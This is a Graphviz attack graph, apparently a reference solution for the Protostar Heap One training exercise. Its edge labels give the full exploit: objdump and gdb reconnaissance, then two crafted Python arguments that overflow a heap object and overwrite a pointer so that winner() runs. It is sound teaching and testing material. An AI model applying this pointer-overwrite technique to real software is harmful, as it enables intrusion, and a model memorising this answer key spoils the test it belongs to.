digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Heap One"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="winner() address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Heap object layout identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="First argument crafted to corrupt second object"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Second argument crafted to overwrite pointer"];
  node4 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="winner() invoked"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/heap1 | grep \" winner$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/heap1"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"A\"*20 + \"\\x68\\xa0\\x04\\x08\"'"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"BBBB\" + \"\\x64\\x84\\x04\\x08\"'"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/heap1 $(python -c 'print \"A\"*20 + \"\\x68\\xa0\\x04\\x08\"') $(python -c 'print \"BBBB\" + \"\\x64\\x84\\x04\\x08\"')"];
}
